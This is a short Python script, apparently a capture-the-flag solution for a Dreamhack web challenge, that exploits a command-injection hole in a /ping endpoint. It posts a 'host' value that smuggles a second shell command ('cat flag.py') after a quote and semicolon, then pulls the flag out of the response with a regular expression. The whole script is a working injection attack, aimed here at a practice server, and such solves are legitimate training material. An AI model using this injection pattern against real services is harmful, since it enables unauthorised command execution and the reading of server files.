import requests
import re

HOST = "http://host1.dreamhack.games"
PORT = 19304

res = requests.post(
    f"{HOST}:{PORT}/ping", data={"host": '8.8.8.8"; cat flag.py; echo "'}
)
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
